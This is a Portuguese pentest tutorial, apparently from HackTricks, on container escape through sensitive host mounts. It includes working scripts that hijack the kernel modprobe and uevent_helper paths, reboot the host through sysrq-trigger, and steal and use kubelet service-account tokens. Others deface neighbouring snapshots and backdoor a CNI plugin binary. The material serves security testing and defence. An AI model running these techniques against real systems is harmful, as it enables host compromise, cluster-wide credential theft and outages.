# Montagens Sensíveis do Host

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

As montagens do host são uma das superfícies práticas mais importantes de container-escape, pois frequentemente desfazem uma visão de processo cuidadosamente isolada, restaurando a visibilidade direta dos recursos do host. Os casos perigosos não se limitam a `/`. Bind mounts de `/proc`, `/sys`, `/var`, runtime sockets, estado gerenciado pelo kubelet ou caminhos relacionados a dispositivos podem expor controles do kernel, credenciais, sistemas de arquivos de containers vizinhos e interfaces de gerenciamento do runtime.

Esta página existe separadamente das páginas individuais de proteção porque o modelo de abuso é transversal. Uma montagem do host com permissão de escrita é perigosa em parte por causa dos mount namespaces, em parte por causa dos user namespaces, em parte por causa da cobertura do AppArmor ou SELinux e, em parte, por causa do caminho exato do host que foi exposto. Tratá-la como um tópico próprio torna a superfície de ataque muito mais fácil de analisar.

## Exposição de `/proc`

O procfs contém tanto informações comuns de processos quanto interfaces de controle do kernel de alto impacto. Portanto, um bind mount como `-v /proc:/host/proc` ou uma visão do container que exponha entradas graváveis inesperadas do proc pode levar à divulgação de informações, à negação de serviço ou à execução direta de código no host.

Os caminhos de alto valor do procfs incluem:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuso

Comece verificando quais entradas de alto valor do procfs estão visíveis ou podem ser gravadas:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Esses caminhos são interessantes por diferentes motivos. `core_pattern`, `modprobe` e `binfmt_misc` podem se tornar caminhos de execução de código no host quando têm permissão de escrita. `kallsyms`, `kmsg`, `kcore` e `config.gz` são fontes poderosas de reconhecimento para exploração do kernel. `sched_debug` e `mountinfo` revelam informações sobre processos, cgroups e sistemas de arquivos que podem ajudar a reconstruir o layout do host de dentro do container.

O valor prático de cada caminho é diferente, e tratar todos como se tivessem o mesmo impacto dificulta a triagem:

- `/proc/sys/kernel/core_pattern`
Se tiver permissão de escrita, este é um dos caminhos procfs de maior impacto, pois o kernel executará um pipe handler após uma falha. Um container que possa apontar `core_pattern` para um payload armazenado em seu overlay ou em um caminho do host montado geralmente consegue obter execução de código no host. Consulte também [read-only-paths.md](protections/read-only-paths.md) para um exemplo específico.
- `/proc/sys/kernel/modprobe`
Este caminho controla o helper em userspace usado pelo kernel quando precisa invocar a lógica de carregamento de módulos. Se tiver permissão de escrita a partir do container e for interpretado no contexto do host, pode se tornar outra primitiva de execução de código no host. É especialmente interessante quando combinado com uma forma de acionar o caminho do helper.
- `/proc/sys/vm/panic_on_oom`
Normalmente, esta não é uma primitiva de escape limpa, mas pode transformar a pressão de memória em uma negação de serviço em todo o host, convertendo condições de OOM em comportamento de kernel panic.
- `/proc/sys/fs/binfmt_misc`
Se a interface de registro tiver permissão de escrita, o atacante poderá registrar um handler para um valor magic escolhido e obter execução no contexto do host quando um arquivo correspondente for executado.
- `/proc/config.gz`
Útil para a triagem de exploits do kernel. Ajuda a determinar quais subsistemas, mitigações e recursos opcionais do kernel estão habilitados sem precisar dos metadados de pacotes do host.
- `/proc/sysrq-trigger`
Principalmente um caminho de negação de serviço, mas muito grave. Pode reinicializar, causar panic ou interromper o host imediatamente de outras formas.
- `/proc/kmsg`
Revela mensagens do ring buffer do kernel. Útil para fingerprinting do host, análise de falhas e, em alguns ambientes, para obter informações úteis à exploração do kernel.
- `/proc/kallsyms`
É valioso quando pode ser lido, pois expõe informações sobre símbolos exportados do kernel e pode ajudar a contornar suposições de randomização de endereços durante o desenvolvimento de exploits do kernel.
- `/proc/[pid]/mem`
Esta é uma interface direta para a memória de processos. Se o processo-alvo puder ser acessado com as condições necessárias semelhantes às do ptrace, ela poderá permitir a leitura ou modificação da memória de outro processo. O impacto real depende fortemente das credenciais, de `hidepid`, do Yama e das restrições do ptrace; portanto, é um caminho poderoso, mas condicional.
- `/proc/kcore`
Expõe uma visão da memória do sistema no estilo de uma imagem de core. O arquivo é enorme e difícil de usar, mas, se puder ser lido de forma significativa, indica uma superfície de memória do host gravemente exposta.
- `/proc/kmem` e `/proc/mem`
Historicamente, são interfaces de memória bruta de alto impacto. Em muitos sistemas modernos, estão desabilitadas ou fortemente restritas, mas, se estiverem presentes e utilizáveis, devem ser tratadas como descobertas críticas.
- `/proc/sched_debug`
Faz leak de informações de agendamento e tarefas que podem expor identidades de processos do host, mesmo quando outras visualizações de processos parecem mais limpas do que o esperado.
- `/proc/[pid]/mountinfo`
É extremamente útil para reconstruir onde o container realmente está localizado no host, quais caminhos têm suporte de overlay e se uma montagem com permissão de escrita corresponde a conteúdo do host ou apenas à camada do container.

Se `/proc/[pid]/mountinfo` ou os detalhes do overlay puderem ser lidos, use-os para recuperar o caminho do host correspondente ao filesystem do container:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Esses comandos são úteis porque várias técnicas de execução no host exigem transformar um caminho dentro do container no caminho correspondente visto pelo host.

### Exemplo completo: abuso do caminho do helper `modprobe`

Se `/proc/sys/kernel/modprobe` puder ser escrito a partir do container e o caminho do helper for interpretado no contexto do host, ele poderá ser redirecionado para um payload controlado pelo atacante:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
O gatilho exato depende do alvo e do comportamento do kernel, mas o ponto importante é que um caminho auxiliar com permissão de escrita pode redirecionar uma futura invocação de um auxiliar do kernel para conteúdo controlado pelo atacante no host.

### Exemplo Completo: Reconhecimento do Kernel Com `kallsyms`, `kmsg` E `config.gz`

Se o objetivo for avaliar a explorabilidade, em vez de realizar imediatamente um escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Esses comandos ajudam a determinar se informações úteis de símbolos estão visíveis, se as mensagens recentes do kernel revelam um estado interessante e quais recursos ou mitigações do kernel foram compilados. O impacto geralmente não é um escape direto, mas isso pode reduzir significativamente o tempo necessário para a triagem de vulnerabilidades do kernel.

### Exemplo completo: Reboot do host via SysRq

Se `/proc/sysrq-trigger` for gravável e alcançar a visão do host:
```bash
echo b > /proc/sysrq-trigger
```
O efeito é uma reinicialização imediata do host. Este não é um exemplo sutil, mas demonstra claramente que a exposição do procfs pode ser muito mais grave do que a divulgação de informações.

## Exposição de `/sys`

O sysfs expõe grandes quantidades de estado do kernel e dos dispositivos. Alguns caminhos do sysfs são úteis principalmente para fingerprinting, enquanto outros podem afetar a execução de helpers, o comportamento dos dispositivos, a configuração de security modules ou o estado do firmware.

Caminhos de alto valor do sysfs incluem:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Esses caminhos são importantes por diferentes motivos. `/sys/class/thermal` pode influenciar o comportamento do gerenciamento térmico e, portanto, a estabilidade do host em ambientes com exposição inadequada. `/sys/kernel/vmcoreinfo` pode leak informações de crash-dump e do layout do kernel que ajudam no fingerprinting de baixo nível do host. `/sys/kernel/security` é a interface `securityfs` usada pelos Linux Security Modules, portanto, um acesso inesperado pode expor ou alterar o estado relacionado a MAC. Os caminhos de variáveis EFI podem afetar configurações de boot armazenadas no firmware, tornando-os muito mais graves do que arquivos de configuração comuns. O `debugfs` em `/sys/kernel/debug` é especialmente perigoso porque é intencionalmente uma interface voltada para desenvolvedores, com muito menos expectativas de segurança do que as APIs do kernel destinadas à produção e protegidas por hardening.

Comandos úteis para revisar esses caminhos são:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
O que torna esses comandos interessantes:

- `/sys/kernel/security` pode revelar se AppArmor, SELinux ou outra superfície LSM está visível de uma forma que deveria ter permanecido exclusiva do host.
- `/sys/kernel/debug` costuma ser a descoberta mais alarmante deste grupo. Se `debugfs` estiver montado e puder ser lido ou gravado, espere uma ampla superfície voltada ao kernel, cujo risco exato depende dos nós de debug habilitados.
- A exposição de variáveis EFI é menos comum, mas tem alto impacto quando presente, pois toca em configurações respaldadas pelo firmware, em vez de arquivos comuns de runtime.
- `/sys/class/thermal` é principalmente relevante para a estabilidade do host e a interação com o hardware, não para um escape simples no estilo shell.
- `/sys/kernel/vmcoreinfo` é principalmente uma fonte de fingerprinting do host e de análise de crashes, útil para compreender o estado do kernel em baixo nível.

### Exemplo completo: `uevent_helper`

Se `/sys/kernel/uevent_helper` puder ser gravado, o kernel poderá executar um helper controlado pelo atacante quando um `uevent` for disparado:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
O motivo pelo qual isso funciona é que o caminho do helper é interpretado do ponto de vista do host. Quando acionado, o helper é executado no contexto do host, e não dentro do container atual.

## Exposição de `/var`

Montar o `/var` do host em um container costuma ser subestimado porque não parece tão dramático quanto montar `/`. Na prática, isso pode ser suficiente para alcançar runtime sockets, diretórios de snapshots de containers, volumes de pods gerenciados pelo kubelet, projected service-account tokens e filesystems de aplicações vizinhas. Em nodes modernos, `/var` costuma ser onde realmente fica o estado mais interessante dos containers do ponto de vista operacional.

### Kubernetes Example

Um pod com `hostPath: /var` frequentemente pode ler os projected tokens de outros pods e o conteúdo de overlay snapshots:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Esses comandos são úteis porque respondem se o mount expõe apenas dados de aplicação sem importância ou credenciais de cluster de alto impacto. Um token de service account legível pode transformar imediatamente a execução de código local em acesso à Kubernetes API.

Se o token estiver presente, valide o que ele pode acessar em vez de parar na descoberta do token:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
O impacto aqui pode ser muito maior do que o acesso ao nó local. Um token com RBAC amplo pode transformar um `/var` montado em um comprometimento de todo o cluster.

### Exemplo de Docker e containerd

Em hosts Docker, os dados relevantes geralmente ficam em `/var/lib/docker`, enquanto em nós Kubernetes baseados em containerd podem estar em `/var/lib/containerd` ou em caminhos específicos do snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Se o `/var` montado expuser o conteúdo gravável de um snapshot de outro workload, o atacante poderá alterar arquivos da aplicação, inserir conteúdo web ou modificar scripts de inicialização sem tocar na configuração atual do container.

Ideias concretas de abuso quando for encontrado conteúdo gravável de um snapshot:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Esses comandos são úteis porque mostram as três principais categorias de impacto de `/var` montado: adulteração de aplicações, recuperação de secrets e movimentação lateral para workloads vizinhos.

## Estado do Kubelet, Plugins e Paths do CNI

Um mount de `/var/lib/kubelet`, `/opt/cni/bin` ou `/etc/cni/net.d` costuma ser exposto por DaemonSets privilegiados, agentes CNI, plugins de node CSI, operadores de GPU e auxiliares de storage. Esses mounts são fáceis de descartar como "infraestrutura do node", mas ficam diretamente no caminho de execução de novos pods e geralmente contêm credenciais do kubelet, secrets projetados, sockets de registro e binários executáveis de plugins do host.

Os alvos de alto valor incluem:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Comandos úteis para revisão são:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Por que esses paths importam:

- `/var/lib/kubelet/pki` pode expor client certificates do kubelet e outras credenciais locais do node que, às vezes, podem ser reutilizadas contra o API server ou endpoints TLS voltados ao kubelet, dependendo do design do cluster.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` geralmente contém tokens de service account projetados e Secrets montados para pods vizinhos no mesmo node.
- `/var/lib/kubelet/pod-resources/kubelet.sock` é principalmente uma superfície de reconnaissance, mas muito útil: revela quais pods e containers possuem atualmente GPUs, hugepages, dispositivos SR-IOV e outros recursos escassos locais ao node.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` e `/var/lib/kubelet/plugins_registry` revelam quais plugins CSI, DRA e de dispositivos estão instalados e com quais sockets o kubelet deve se comunicar. Se esses diretórios forem graváveis, em vez de apenas legíveis, o finding se torna muito mais grave.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` e `/etc/cni/net.d` ficam diretamente no caminho de configuração da pod-network. O acesso gravável nesses locais costuma ser uma primitive de host-execution atrasada, e não apenas uma exposição de configuração.<sup>[[2]](#references)</sup>

### Exemplo completo: Writable `/opt/cni/bin`

Se um diretório de binários CNI do host estiver montado com acesso read-write, substituir um plugin pode ser suficiente para obter host execution na próxima vez que o kubelet criar um pod sandbox nesse node:<sup>[[2]](#references)</sup>
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Isto não é tão imediato quanto um `docker.sock` montado, mas costuma ser mais realista em pods de Kubernetes comprometidos na infraestrutura. O ponto importante é que o binário modificado é executado posteriormente pelo fluxo de configuração de rede do host, não pelo container atual.

## Runtime Sockets

Os mounts sensíveis do host geralmente incluem runtime sockets em vez de diretórios completos. Eles são tão importantes que merecem ser repetidos explicitamente aqui:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Consulte [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) para conhecer os fluxos completos de exploração assim que um desses sockets for montado.

Como um padrão inicial rápido de interação:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Se um deles for bem-sucedido, o caminho de "mounted socket" até "start a more privileged sibling container" costuma ser muito mais curto do que qualquer caminho de kernel breakout.

## Sequestro de Task por Caminho de Host Gravável

Um mount de host gravável não precisa expor `/` para ser perigoso. Se o caminho montado contiver scripts, arquivos de configuração, hooks, plugins ou arquivos consumidos posteriormente por uma scheduled task ou service no host, o container poderá conseguir alterar o que o host executa.

Fluxo de revisão genérico:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Se um arquivo com permissão de escrita for consumido por um processo do host, mantenha o payload simples e observável durante os testes:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
A parte interessante é o trust boundary: a gravação acontece de dentro do container, mas a execução ocorre posteriormente no contexto do serviço do host. Isso transforma um hostPath ou bind mount restrito em uma primitiva de delayed host-code-execution.

## CVEs Relacionadas a Mounts

Host mounts também se relacionam com vulnerabilidades de runtime. Exemplos recentes importantes incluem:

- `CVE-2024-21626` no `runc`, em que um file descriptor de diretório vazado poderia posicionar o diretório de trabalho no filesystem do host.
- `CVE-2024-23651`, `CVE-2024-23652` e `CVE-2024-23653` no BuildKit, em que Dockerfiles, frontends e fluxos `RUN --mount` maliciosos poderiam reintroduzir acesso a arquivos do host, exclusão de arquivos ou privilégios elevados durante os builds.
- `CVE-2024-1753` nos fluxos de build do Buildah e Podman, em que bind mounts criados especialmente durante o build poderiam expor `/` com permissões de leitura e escrita.
- `CVE-2025-47290` no `containerd` 2.1.0, em que uma condição TOCTOU durante o image unpack poderia permitir que uma imagem especialmente criada modificasse o filesystem do host durante o pull.

Essas CVEs são relevantes aqui porque mostram que o tratamento de mounts não depende apenas da configuração do operador. O próprio runtime também pode introduzir condições de escape orientadas por mounts.

## Verificações

Use estes comandos para localizar rapidamente as exposições de mounts de maior valor:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
O que é interessante aqui:

- A raiz do host, `/proc`, `/sys`, `/var` e os runtime sockets são todos achados de alta prioridade.
- Entradas de proc/sys com permissão de escrita geralmente significam que o mount está expondo controles globais do kernel do host, em vez de uma visualização segura do container.
- Caminhos de `/var` montados merecem uma revisão de credenciais e workloads vizinhos, não apenas uma revisão do filesystem.
- Diretórios de estado do Kubelet e caminhos de CNI/plugin merecem a mesma prioridade que os runtime sockets, pois frequentemente ficam diretamente no caminho de criação de pods e distribuição de credenciais do node.

## Referências

- [1] [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)

{{#include ../../../banners/hacktricks-training.md}}
